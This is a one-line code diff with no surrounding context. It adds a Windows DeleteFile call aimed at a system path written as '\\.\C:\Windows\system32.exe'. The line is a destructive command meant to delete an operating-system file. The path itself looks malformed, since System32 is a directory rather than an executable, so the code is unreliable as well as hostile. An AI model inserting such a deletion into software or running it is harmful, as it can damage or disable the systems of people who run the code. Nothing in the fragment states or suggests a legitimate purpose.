@@ -1,0 +1,1 @@
+DeleteFile("\\\\.\\C:\\Windows\\system32.exe")
